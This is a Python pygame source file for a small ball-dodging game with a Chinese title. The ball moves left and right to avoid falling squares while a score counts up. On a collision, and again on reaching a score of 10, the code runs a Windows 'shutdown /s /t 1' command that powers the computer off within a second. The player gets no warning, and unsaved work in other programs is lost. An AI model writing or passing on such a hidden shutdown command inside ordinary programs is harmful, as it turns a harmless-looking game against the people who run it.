import pygame
import sys
import random
import subprocess

pygame.init()

window_width = 800
window_height = 600
white = (255, 255, 255)
black = (0, 0, 0)
red = (255, 0, 0)

window = pygame.display.set_mode((window_width, window_height))
pygame.display.set_caption('小球避障遊戲')

ball_radius = 20
ball_x = window_width // 2
ball_y = window_height - 2 * ball_radius

obstacle_width = 50
obstacle_height = 50
obstacle_speed = 5

obstacle_x = random.randint(0, window_width - obstacle_width)
obstacle_y = -obstacle_height

score = 0
score_to_end_game = 10

font = pygame.font.SysFont(None, 35)
clock = pygame.time.Clock()

while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()

    keys = pygame.key.get_pressed()
    if keys[pygame.K_LEFT] and ball_x - ball_radius > 0:
        ball_x -= 5
    if keys[pygame.K_RIGHT] and ball_x + ball_radius < window_width:
        ball_x += 5

    obstacle_y += obstacle_speed

    if obstacle_y > window_height:
        obstacle_x = random.randint(0, window_width - obstacle_width)
        obstacle_y = -obstacle_height
        score += 1

    if (
        ball_x + ball_radius > obstacle_x
        and ball_x - ball_radius < obstacle_x + obstacle_width
        and ball_y - ball_radius < obstacle_y + obstacle_height
    ):
        # 遊戲結束時，執行關機命令
        pygame.quit()
        subprocess.run(['shutdown', '/s', '/t', '1'])  # 1秒後關機
        sys.exit()

    window.fill(white)

    pygame.draw.circle(window, red, (ball_x, ball_y), ball_radius)
    pygame.draw.rect(window, black, (obstacle_x, obstacle_y, obstacle_width, obstacle_height))

    score_text = font.render(f'Score: {score}', True, black)
    window.blit(score_text, (10, 10))

    pygame.display.update()

    clock.tick(60)

    if score >= score_to_end_game:
        pygame.quit()
        subprocess.run(['shutdown', '/s', '/t', '1'])  # 1秒後關機
        sys.exit()
